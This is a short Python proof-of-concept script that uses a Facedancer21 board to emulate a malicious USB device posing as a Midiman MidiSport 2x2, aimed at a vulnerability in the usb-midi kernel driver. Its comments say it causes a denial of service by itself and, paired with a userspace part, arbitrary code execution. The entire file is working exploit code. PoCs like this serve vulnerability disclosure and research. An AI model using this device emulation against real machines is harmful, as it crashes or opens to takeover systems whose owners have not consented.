#!/usr/bin/env python3

# A part of the proof-of-concept exploit for the vulnerability in the usb-midi
# driver. Can be used on it's own for a denial of service attack. Should be
# used in conjuction with a userspace part for an arbitrary code execution
# attack.
#
# Requires a Facedancer21 board
# (http://goodfet.sourceforge.net/hardware/facedancer21/).
#
# Andrey Konovalov <anreyknvl@gmail.com>

from USB import *
from USBDevice import *
from USBConfiguration import *
from USBInterface import *

class PwnUSBDevice(USBDevice):
    name = "USB device"

    def __init__(self, maxusb_app, verbose=0):
        interface = USBInterface(
                0,                      # interface number
                0,                      # alternate setting
                255,                    # interface class
                0,                      # subclass
                0,                      # protocol
                0,                      # string index
                verbose,
                [],
                {}
        )

        config = USBConfiguration(
                1,                      # index
                "Emulated Device",      # string desc
                [ interface ]           # interfaces
        )

        USBDevice.__init__(
                self,
                maxusb_app,
                0,                      # device class
                0,                      # device subclass
                0,                      # protocol release number
                64,                     # max packet size for endpoint 0
                0x0763,                 # vendor id
                0x1002,                 # product id
                0,                      # device revision
                "Midiman",              # manufacturer string
                "MidiSport 2x2",        # product string
                "?",                    # serial number string
                [ config ],
                verbose=verbose
        )

from Facedancer import *
from MAXUSBApp import *

sp = GoodFETSerialPort()
fd = Facedancer(sp, verbose=1)
u = MAXUSBApp(fd, verbose=1)

d = PwnUSBDevice(u, verbose=4)

d.connect()

try:
    d.run()
except KeyboardInterrupt:
    d.disconnect()
